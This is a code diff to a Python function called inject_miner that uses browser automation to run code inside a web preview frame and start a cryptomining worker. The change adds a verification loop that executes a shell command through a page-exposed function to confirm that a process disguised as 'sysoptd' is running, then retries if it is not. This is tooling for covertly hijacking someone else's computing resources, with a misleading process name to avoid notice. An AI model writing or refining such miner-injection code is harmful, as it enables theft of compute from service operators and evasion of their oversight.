@@ -337,15 +337,34 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
             }})()
             """
             
-            result = await asyncio.wait_for(preview_frame.evaluate(exec_code), timeout=60)
+            result = await asyncio.wait_for(preview_frame.evaluate(exec_code), timeout=45)
             print(f"   Execution result: {result}")
+        except asyncio.TimeoutError:
+            print("   ⏳ Start command gave no reply in 45s — checking if worker is up anyway")
         except Exception as e:
-            print(f"   ⚠️  Execution warning: {e}")
-        
-        print(f"✅ Worker command sent! Folder: {folder_name}")
-        print(f"   Check logs: /tmp/m.log (if accessible)")
-        
-        return True
+            print(f"   ⚠️  Start command error: {type(e).__name__}: {e} — checking worker")
+
+        # Never trust the start reply alone — confirm sysoptd is actually running.
+        verify_js = """async () => {
+            if (typeof window.doc !== 'function') return 'nodoc';
+            try {
+                const r = await window.doc("ps -A -o args | grep -c '[s]ysoptd'");
+                return r && r.stdout !== undefined ? String(r.stdout).trim() : 'no-probe';
+            } catch (e) { return 'probe-error'; }
+        }"""
+        for check in range(1, 5):
+            await asyncio.sleep(5 if check == 1 else 8)
+            try:
+                count = await asyncio.wait_for(preview_frame.evaluate(verify_js), timeout=15)
+            except Exception as e:
+                count = f"eval-{type(e).__name__}"
+            if str(count).isdigit() and int(count) > 0:
+                print(f"✅ Worker confirmed running ({count} procs) — folder {folder_name}")
+                return True
+            print(f"   ⏳ Worker not seen yet (check {check}/4: {count})")
+
+        print("❌ Worker not running after start — caller will retry in place")
+        return False
         
     except Exception as e:
         print(f"❌ Injection failed: {e}")
